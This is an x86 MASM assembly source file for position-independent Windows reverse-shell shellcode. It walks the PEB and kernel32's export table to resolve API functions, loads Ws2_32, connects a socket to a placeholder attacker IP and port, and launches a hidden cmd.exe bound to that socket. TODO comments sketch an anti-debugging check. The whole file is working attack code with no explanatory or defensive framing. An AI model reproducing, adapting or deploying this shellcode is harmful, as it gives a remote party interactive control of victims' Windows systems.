.686p 
.xmm
.model flat,c
.stack 4096


; include C libraries
includelib      msvcrtd
includelib      ws2_32

.code
        
public  main

main proc

    ; define local variables
    
    addrExitProcess= dword ptr -250h
    exitprocessStr= dword ptr -24Ch
    addrConnect= dword ptr -248h
    connectStr= dword ptr -244h
    addrWSASocketA= dword ptr -240h
    wsaSocketAStr= dword ptr -23Ch
    addrWSAStratup= dword ptr -238h
    wsaStartupStr= dword ptr -234h
    addrWs2= dword ptr -230h ; dll
    Ws2Str= dword ptr -22Ch ; dll str
    addrSockaddr_in= dword ptr -228h ; sockaddr_in struct
    addrSocket= dword ptr -218h ; socket struct
    addrWSADATA= dword ptr -214h ; wsadata struct
    addrPI= dword ptr -084h ; PI struct
    addrSI= dword ptr -74h ; SI struct

    addrAllocatedMemory= dword ptr -30h
    name_pointer_table_addr= dword ptr -2Ch
    address_table_addr= dword ptr -28h
    ordinal_table_addr= dword ptr -24h
    addr_of_loadLibraryA= dword ptr -20h
    addr_of_getProcAddress= dword ptr -1Ch

    addrCreateProcessA= dword ptr -18h

    cmdStr= dword ptr -14h
    createProcessAStr= dword ptr -10h

    getProcAddressStr= dword ptr -0Ch
    LoadLibraryAstr= dword ptr -08h
    krnl32_image_base= dword ptr -04h

    push eax ; Save all registers
    push ebx
    push ecx
    push edx
    push esi
    push edi

    push ebp
	mov ebp, esp
	sub esp, 250h 			; Allocate memory on stack for local variables

    
    call find_shellcode_real_address    ; makes rip (curr instruction register) get pushed to the stack

    find_shellcode_real_address:
        pop     edi    ; store address of shellcode
    
    mov     esi, offset find_shellcode_real_address    ; store "fake" address of shellcode

    mov	    eax, LABEL_STR_LOADLIBRARYA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + loadLibraryAstr], eax    ; name LoadLibraryA

    mov	    eax, LABEL_STR_GETPROCADDRESS     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + getProcAddressStr], eax    ; name GetProcAddress

    mov	    eax, LABEL_STR_CREATEPROCESSA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + createProcessAStr], eax    ; name createProcessA

    mov	    eax, LABEL_STR_CMD    ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + cmdStr], eax    ; name svchost

    mov     eax, LABEL_STR_WS2 ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + Ws2Str], eax     ; name Ws2_32.dll

    mov     eax, LABEL_STR_WSASTARTUP ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + wsaStartupStr], eax     ; name WSAStartup

    mov     eax, LABEL_STR_WSASOCKETA ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + wsaSocketAStr], eax     ; name WSASocketA

    mov     eax, LABEL_STR_CONNECT ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + connectStr], eax     ; name connect

    mov     eax, LEBEL_STR_EXITPROCESS 
    sub     eax, esi
    add     eax, edi
    mov     [ebp + exitprocessStr], eax

    
    ; no need for real and fake address of shellcode anymore, since we finished with constants
    
    ASSUME fs:nothing

    mov     eax, fs:[30h]     ; Get pointer to PEB

    ASSUME FS:ERROR

    ; TODO - mov     edx, [eax + 2h]
    ; TODO - cmp     edx, 1 ; check if being debugged
    ; TODO - jz      MAIN_END ; if being debugged, end

    mov     eax, [eax + 0Ch]    ; Get pointer to PEB_LDR_DATA
    mov     eax, [eax + 14h]    ; Get pointer to first entry in InMemoryOrderModuleList
    mov     eax, [eax]  ; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax]   ; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax + 10h]    ; Get kernel32.dll image base
    mov     [ebp + krnl32_image_base], eax ; save image base

    add     eax, [eax + 3Ch]    ; get to e_lfanew
    mov     eax, [eax + 78h]    ; get RVA of DataDirectory[0] - exports directory 
    add     eax, [ebp + krnl32_image_base]     ; add image base get to DataDirectory[0] - exports directory
    
    ; Now, as eax contains the address of DataDirectory[0], we can traverse it to find what we need

    mov     ebx, [eax + 1Ch]    ; get RVA of address table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to address table
    mov     [ebp + address_table_addr], ebx

    mov     ebx, [eax + 20h]    ; get RVA of name pointer table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to name pointer table
    mov     [ebp + name_pointer_table_addr], ebx

    mov     ebx, [eax + 24h]    ; get RVA of ordinals table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to ordinals table
    mov     [ebp + ordinal_table_addr], ebx

    mov     edx, [eax + 14h]    ; number of exported functions

    xor     eax, eax   ; reset counter to 0

    LOOP_TO_FIND_LOADLIBRARYA:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + LoadLibraryAstr]     ; name LoadLibraryA
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenLoadLibraryAstr
        repe    cmpsb     ; compare the first (length of LoadLibraryA) bytes

        jz FOUND_LOADLIBRARYA

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_LOADLIBRARYA

        FOUND_LOADLIBRARYA:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]    ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_loadLibraryA], eax
    
    
    xor     eax, eax    ; reset counter to 0

    LOOP_TO_FIND_GETPROCADDRESS:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + getProcAddressStr]     ; name GetProcAddress
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenGetProcAddressStr
        repe    cmpsb     ; compare the first (length of GetProcAddress) bytes

        jz FOUND_GETPROCADDRESS

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_GETPROCADDRESS

        FOUND_GETPROCADDRESS:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]     ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_getProcAddress], eax

    USE_FUNCTIONS:
        
        ; Load Ws2_32.dll
        
        mov     eax, [ebp + addr_of_loadLibraryA] 
        push    [ebp + Ws2Str] ; the name of the dll to find
        call eax ; call LoadLibraryA
        mov [ebp + addrWs2], eax ; get the address of the dll 

        ; Get address of ExitProcess

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + exitprocessStr]
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrExitProcess], eax

        ; Get address of CreateProcessA

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + createProcessAStr]      ; name createProcessA
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrCreateProcessA], eax

        ; Get address of WSAStartup
        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + wsaStartupStr] ; name WSAStartup
        push    [ebp + addrWs2] ; the handle of Ws2_32.dll
        call    eax ; call GetProcAddress
        mov     [ebp + addrWSAStratup], eax

        ; Get address of WSASocketA
        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + wsaSocketAStr] ; name WSASocketA
        push    [ebp + addrWs2] ; the handle of Ws2_32.dll
        call    eax ; call GetProcAddress
        mov     [ebp + addrWSASocketA], eax

        ; Get address of connect
        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + connectStr] ; name connect
        push    [ebp + addrWs2] ; the handle of Ws2_32.dll
        call    eax ; call GetProcAddress
        mov     [ebp + addrConnect], eax

        ; call WSAStartup
        mov     eax, [ebp + addrWSAStratup] ; WSAStartup call
        
        lea     edx, [ebp + addrWSADATA]
        push    edx  ; push the addr of WSADATA struct
        push    0202h; push MAKEWORD(2, 2)

        call eax ; call WSAStartup

        ; call WSASocketA - save result to addrSocket
        mov     eax, [ebp + addrWSASocketA] ; WSASocketA call
        push    0h
        push    0h
        push    0h
        push    6h ; IPPROTO_TCP
        push    1h ; SOCK_STREAM
        push    2h ; AF_INET

        call eax ; call WSASocketA 
        mov [ebp + addrSocket], eax

        ; set sockaddr_in struct values
        mov     [ebp + addrSockaddr_in], 2h ; set sin_family to AF_INET
        mov     [ebp + addrSockaddr_in + 2h], "Your htons(PORT) goes here" ; set sin_port to htons(PORT)
        mov     [ebp + addrSockaddr_in + 4h], "Your inet_addr(host IP) goes here" ; set sin_addr.s_addr to inet_addr(host IP)

        ; call connect
        mov     eax, [ebp + addrConnect] ; connect call
        push    10h ; sizeof(sockaddr_in)
        
        lea     edx, [ebp + addrSockaddr_in] 
        push    edx ; push the addr of sockaddr_in struct

        mov     edx, [ebp + addrSocket]
        push    edx ; push the socket
        
        call eax ; call connect
                
        ; zero SI and PI structs
        mov     ecx, 15h ; 54h (44h + 10h) / 4
        ZERO_MEMORY:
            mov     [ebp + addrPI + ecx * 4], 0
            loop ZERO_MEMORY

        ; set STARTUPINFO struct values
        mov     [ebp + addrSI], 44h ; set cb to sizeof(si)
        mov     [ebp + addrSI + 2Ch], 100h ; set dwFlags to STARTF_USESTDHANDLES

        mov     edx, [ebp + addrSocket] 

        mov     [ebp + addrSI + 38h], edx ; set hStdInput to the socket
        mov     [ebp + addrSI + 3Ch], edx ; set hStdOutput to the socket
        mov     [ebp + addrSI + 40h], edx ; set hStdError to the socket

        ; call CreateProcessA
        mov     eax, [ebp + addrCreateProcessA] ; CreateProcessA call

        lea     edx, [ebp + addrPI] ; load PI struct's addr
        push    edx
        lea     edx, [ebp + addrSI] ; load SI struct's addr
        push    edx

        push    0 ; lpCurrentDirectory - NULL
        push    0 ; lpEnvironment - NULL
        push    08000000h ; dwCreationFlags - CREATE_NO_WINDOW
        push    1 ; bInheritHandles - True
        push    0 ; lpThreadAttributes - NULL
        push    0 ; lpProcessAttributes - NULL
        push    [ebp + cmdStr] ; cmdline - "cmd.exe"
        push    0 ; cmd process path
        
        call eax ; call CreateProcessA

        ; call ExitProcess

        mov     eax, [ebp + addrExitProcess]
        push    0 ; EXIT_SUCCESS

        call eax ; call ExitProcess


    MAIN_END:

    add     esp, 250h 

    pop ebp 		; restore all registers and exit
	pop edi
    pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax

	retn

    ; String constants

    LABEL_STR_LOADLIBRARYA:
        loadLibraryAstrInLabel db "LoadLibraryA", 0
        lenLoadLibraryAstr equ $ - loadLibraryAstrInLabel

    LABEL_STR_GETPROCADDRESS:
        getProcAddressStrInLabel db "GetProcAddress", 0
        lenGetProcAddressStr equ $ - getProcAddressStrInLabel

    LABEL_STR_CREATEPROCESSA:
        createProcessAStrInLabel db "CreateProcessA", 0
        lenCreateProcessAStr equ $ - createProcessAStrInLabel

    LABEL_STR_CMD:
        cmdStrInLabel db "cmd", 0
        lenCmdStr equ $ - cmdStrInLabel

    LABEL_STR_WS2:
        ws2StrInLabel db "Ws2_32.dll", 0
        lenWs2Str equ $ - ws2StrInLabel

    LABEL_STR_WSASTARTUP:
        wsastartupStrInLabel db "WSAStartup", 0
        lenWsaStartupStr equ $ - wsastartupStrInLabel

    LABEL_STR_WSASOCKETA:
        wsasocketaStrInLabel db "WSASocketA", 0
        lenWsaSocketAStr equ $ - wsasocketaStrInLabel

    LABEL_STR_CONNECT:
        connectStrInLabel db "connect", 0
        lenConnectStr equ $ - connectStrInLabel

    LEBEL_STR_EXITPROCESS:
        exitprocessStrInLabel db "ExitProcess", 0
        lenExitProcessStr equ $ - exitprocessStrInLabel
        

main endp

        end